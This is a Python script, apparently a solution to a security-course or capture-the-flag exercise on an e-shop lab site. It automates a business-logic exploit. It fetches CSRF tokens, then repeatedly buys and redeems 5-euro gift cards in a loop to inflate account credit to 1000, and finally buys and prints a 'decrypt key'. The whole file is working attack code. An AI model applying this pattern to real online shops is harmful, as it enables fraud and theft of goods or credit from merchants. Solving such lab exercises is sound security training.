from http import HTTPStatus
from pathlib import Path

import typer
import requests
from lxml import html
from rich.console import Console
from rich.progress import track

console = Console()
app = typer.Typer()


@app.command()
def run():

    #this is useful because it will take by itself the cookies set by the website, I don't need to perform additional requests to get them
    #it is more easy
    session = requests.session()

    #the website needs it, we can see explicitly in the response if we don't put it
    session.headers.update({'Referer': 'https://cod.alviano.org/eshop/gift/'})

    success_resp = 'Success! <script>window.location = "/eshop/gift/"</script>'

    response = session.get(
       "https://cod.alviano.org/eshop/gift/")
    
    if response.status_code == HTTPStatus.OK:
        extract_csrf_from_response(response)
    
    credit = find_credit_from_response(response)
   
    while credit < 1000:
        response = session.get(
        "https://cod.alviano.org/eshop/gift/")

        if response.status_code == HTTPStatus.OK:
            csrf = extract_csrf_from_response(response)
            
            response = session.post(
            "https://cod.alviano.org/eshop/gift/", data= {
            "csrfmiddlewaretoken" : csrf,
            "product": "gift-card-5-euro"
            })
        #print(response.text)
        #print(state)
        

            if response.text == success_resp:
                
                response = session.get(
                "https://cod.alviano.org/eshop/gift/")

                #print(response.text)
                code = extract_gift_code_from_response(response)      
            
                csrf = extract_csrf_from_response(response)
                
                print(f"Gift card code: {code}")
                response = session.post(
                "https://cod.alviano.org/eshop/gift/", data= {
                "csrfmiddlewaretoken" : csrf,
                "redeem": code
                })
                    
                #print(response.text)
                #print(state)
                #print(response.headers)
                    
                    
                response = session.get(
                "https://cod.alviano.org/eshop/gift/")
                #print(response.text)
                credit = find_credit_from_response(response)
                print(f"Credit: {credit}")
                print()



    response = session.get(
        "https://cod.alviano.org/eshop/gift/")

    if response.status_code == HTTPStatus.OK:
        csrf = extract_csrf_from_response(response)
        
        response = session.post(
        "https://cod.alviano.org/eshop/gift/", data= {
        "csrfmiddlewaretoken" : csrf,
        "product": "decrypt-key"
        })
    
    response = session.get(
        "https://cod.alviano.org/eshop/gift/")
    key =  find_key_from_response(response)

    print(f"KEY: {key}")

def find_key_from_response(response):
    key=''.join(response.text.split("<b>Decrypt key:</b>")[1].split("</p>")[0])
    return key

def extract_gift_code_from_response(response):
    html_document = html.fromstring(response.content)
    code=html_document.xpath('//ul/li')[0].text    
    code=code.replace(" ", "").strip()
    return code

def extract_csrf_from_response(response):
    html_document = html.fromstring(response.content)
        
    csrf=html_document.xpath('//input[@name="csrfmiddlewaretoken"]/@value')[0]
    return csrf

def find_credit_from_response(response):
    if "<b>Gift cards:</b>" in response.text:
        credit=''.join(response.text.split("Credit: €")[1].split("<p")[0])
    else:
        credit=''.join(response.text.split("Credit: €")[1].split("</div>")[0])
    
    credit = int(credit)
    return credit
            

        #print(response.text)
    
    
    #print(response.text)

    

if __name__ == "__main__":
    app()